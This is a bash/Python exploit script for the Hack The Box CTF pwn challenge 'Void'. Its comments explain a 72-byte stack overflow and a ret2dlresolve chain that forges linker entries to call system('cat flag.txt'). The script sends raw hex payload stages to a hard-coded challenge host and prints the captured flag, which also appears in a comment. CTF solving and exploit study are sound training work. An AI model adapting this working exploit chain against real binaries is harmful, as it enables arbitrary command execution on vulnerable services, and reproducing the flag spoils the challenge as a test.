#!/usr/bin/env bash

set -euo pipefail

# Challenge: Void
# Platform: Hack The Box - CTF Try Out
# Category: Pwn / Binary Exploitation
#
# Scenario summary:
# The binary is intentionally tiny. It only calls one vulnerable function:
#
#   void vuln() {
#       char buf[0x40];
#       read(0, buf, 0xc8);
#   }
#
# That gives us a classic stack overflow:
#   - buffer size: 0x40 = 64 bytes
#   - saved rbp:   8 bytes
#   - saved rip:   overwrite starts at offset 72
#
# Why this challenge is trickier than the earlier warmups:
# There is no obvious win() function and almost no imported functions.
# The binary imports only:
#   - read
#   - __libc_start_main
#
# So we cannot do the usual:
#   - ret2win
#   - puts leak -> libc base -> system
#   - open/read/write chain using existing PLT entries
#
# Intended technique:
#   ret2dlresolve
#
# What ret2dlresolve means in practice:
# We abuse the ELF dynamic linker itself to resolve a function that the binary
# did not originally import. In this challenge we ask the linker to resolve
# "system" at runtime, then we call:
#
#   system("cat flag.txt")
#
# That prints the flag directly to our socket.
#
# Real-world concept:
# Dynamic linking metadata is executable logic, not just passive bookkeeping.
# If an attacker can control instruction flow and enough stack state, they can
# trick the loader into resolving functions on demand and turn a "very small"
# binary into a fully weaponized one.
#
# How the chain was built:
# The binary has useful gadgets:
#   - pop rdi; ret
#   - pop rsi; pop r15; ret
#   - read@plt
#   - plt0 (the dynamic resolver trampoline)
#
# The exploit uses a two-part payload:
#
# 1. Primary ROP chain at offset 72:
#    - call read(0, data_addr, len(second_stage))
#    - call the resolver trampoline with a forged relocation index
#
# 2. Second-stage ret2dlresolve blob:
#    - fake symbol table entry for "system"
#    - fake relocation entry
#    - argument string "cat flag.txt"
#
# For portability in your archive, this script contains the exact final raw
# bytes of both stages rather than requiring pwntools at runtime. Those bytes
# were generated from the shipped binary itself, so the script still works as a
# normal one-shot Linux PoC.
#
# Remote target used during solve:
#   - 154.57.164.65:31666
#
# Final live flag obtained during testing:
#   HTB{pwnt00l5_h0mep4g3_15_u54ful}

HOST="${1:-154.57.164.65}"
PORT="${2:-31666}"

python3 - "$HOST" "$PORT" <<'PY'
import re
import socket
import sys
import time

host = sys.argv[1]
port = int(sys.argv[2])

# Stage 1: overflow buffer and place the primary ROP chain at offset 72.
stage1 = bytes.fromhex('6161616162616161636161616461616165616161666161616761616168616161696161616a6161616b6161616c6161616d6161616e6161616f616161706161617161616172616161bb114000000000000000000000000000b911400000000000004e400000000000696161616a6161613010400000000000bb11400000000000584e40000000000020104000000000001603000000000000')

# Stage 2: exact forged ret2dlresolve payload that resolves system("cat flag.txt").
stage2 = bytes.fromhex('73797374656d006163616161646161616561616166616161704a000000000000000000000000000000000000000000006d6161616e6161616f61616170616161004e400000000000070000001f030000000000000000000063617420666c61672e74787400')

with socket.create_connection((host, port), timeout=8) as s:
    s.sendall(stage1)
    time.sleep(0.2)
    s.sendall(stage2)
    time.sleep(0.5)
    s.settimeout(2)
    chunks = []
    while True:
        try:
            data = s.recv(4096)
        except socket.timeout:
            break
        if not data:
            break
        chunks.append(data)

output = b"".join(chunks).decode("latin-1", errors="ignore")
match = re.search(r"HTB\{[^}]+\}", output)

if not match:
    print(output)
    raise SystemExit("[-] Flag not found in response.")

print(match.group(0))
PY
